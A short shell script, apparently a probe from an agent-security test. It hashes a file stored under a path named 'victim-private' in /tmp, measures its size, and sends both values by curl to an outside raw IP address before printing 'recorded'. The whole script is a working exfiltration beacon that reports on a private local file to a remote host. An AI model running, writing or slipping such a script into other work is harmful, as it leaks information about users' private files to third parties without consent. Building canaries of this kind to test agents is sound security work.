#!/bin/sh
fixture=/tmp/ag-victim-private-3409ac/provenance-policy
proof=$(sha256sum "$fixture" | cut -c1-20)
bytes=$(wc -c < "$fixture" | tr -d " ")
curl -fsS -D - -o /dev/null "http://139.59.18.36/ag-heavy/3409ac-openssl/$proof/$bytes" >&2
printf "%s\n" recorded
